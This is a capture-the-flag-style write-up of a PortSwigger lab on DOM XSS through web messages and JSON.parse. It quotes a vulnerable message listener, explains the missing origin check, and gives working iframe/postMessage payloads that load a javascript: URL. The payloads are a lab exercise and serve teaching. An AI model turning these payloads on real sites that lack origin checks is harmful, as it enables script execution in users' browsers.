# [DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)

> on the page there is a `"message"` event listener

```
<script>
  window.addEventListener(
    "message",
    function (e) {
      var iframe = document.createElement("iframe"),
        ACMEplayer = { element: iframe },
        d;
      document.body.appendChild(iframe);
      try {
        d = JSON.parse(e.data);
      } catch (e) {
        return;
      }
      switch (d.type) {
        case "page-load":
          ACMEplayer.element.scrollIntoView();
          break;
        case "load-channel":
          ACMEplayer.element.src = d.url;
          break;
        case "player-height-changed":
          ACMEplayer.element.style.width = d.width + "px";
          ACMEplayer.element.style.height = d.height + "px";
          break;
      }
    },
    false,
  );
</script>
```

> this script has two issues:

- No origin check, `e.origin` is never inspected, so any window can send it data
- the switch `case "load-channel":` ads the `data.url` without any checks

> exploit idea

```
window.postMessage('{"type":"load-channel","url":"javascript:print()"}');
```

- the `'` and the `"` already in use in the exploit below:

```
<iframe src="https://xxx.web-security-academy.net/" onload='this.contentWindow.postMessage("...","*")'>
</iframe>
```

- keep the JSON syntax with escape characters:

```
"{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}"
```

> the exploit:

```
<iframe src="https://xxx.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

or

```
<iframe
  src="https://xxx.web-security-academy.net/"
  onload="
    this.contentWindow.postMessage(
      '{&quot;type&quot;:&quot;load-channel&quot;,&quot;url&quot;:&quot;javascript:print()&quot;}',
      '*',
    )
  "
>
</iframe>
```

- in an `iframe` posting a message to its content `window` object a JSON
- `this.contentWindow.postMessage()` posts the message to its content
- `.postMessage()` first argument is the data (the JSON in this case)
- `.postMessage()` second argument, the `targetOrigin` specifies if the `iframe` content origin is the same as the `targetOrigin` then its sends the message, otherwise not
- but `.postMessage(...,'*')`, `'*'` as `targetOrigin` is a wildcard that tells that don't care of the origin of receiver
- `e.origin` and `targetOrigin` is not the same value
